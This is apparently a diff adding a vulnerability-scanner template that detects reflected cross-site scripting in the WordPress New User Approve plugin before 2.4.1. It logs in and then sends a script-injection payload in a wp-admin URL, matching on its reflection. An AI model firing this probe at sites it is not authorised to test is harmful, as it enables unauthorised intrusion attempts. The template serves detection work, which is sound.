@@ -1,0 +1,49 @@
+id: new-user-approve-xss
+
+info:
+  name: WordPress New User Approve <2.4.1 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/17f99601-f5c9-4300-9b4a-6d75fa7ab94a
+    - https://wordpress.org/plugins/new-user-approve
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wordpress,xss,authenticated,wp-plugin,wpscan,wp
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '?a"><script>alert(1)</script>&new-user-approve-settings'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502204813aa5632a3ceb702ca4228815cbd249cf126b16512dcfd9185865689c5ce00022100c670295c6158eb2de53665dd417f67581db04fcd10afd145f57a9ccbbe9445f4:922c64590222798bb761d5b6d8e72950
